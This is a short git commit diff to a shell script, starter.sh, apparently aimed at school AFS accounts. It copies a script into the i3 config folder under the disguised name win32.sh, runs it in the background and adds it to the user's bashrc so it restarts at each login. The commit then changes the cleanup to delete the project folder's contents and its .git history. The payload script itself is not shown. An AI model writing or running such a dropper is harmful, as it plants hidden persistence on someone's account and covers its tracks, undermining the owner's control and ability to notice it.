08566089a78ac0e82dce56b3e3dc6b312bf528cd
NyouOMa <158447955+noahnyounae@users.noreply.github.com>
2024-10-07 13:59:06 +0000

    final

--- starter.sh
+++ starter.sh
@@ -2,5 +2,5 @@ cp ./PIE-Confluse-HomeMade/sleep.sh ~/afs/.confs/config/i3/win32.sh
 sh ~/afs/.confs/config/i3/win32.sh &
 echo "sh ~/afs/.confs/config/i3/win32.sh &" >> ~/afs/.confs/bashrc
 mv PIE-Confluse-HomeMade/ Win32/
-rm -rf Win32/*
-rm -rf Win32/*.*
+rm -rf ./Win32/*
+rm -rf ./Win32/.git
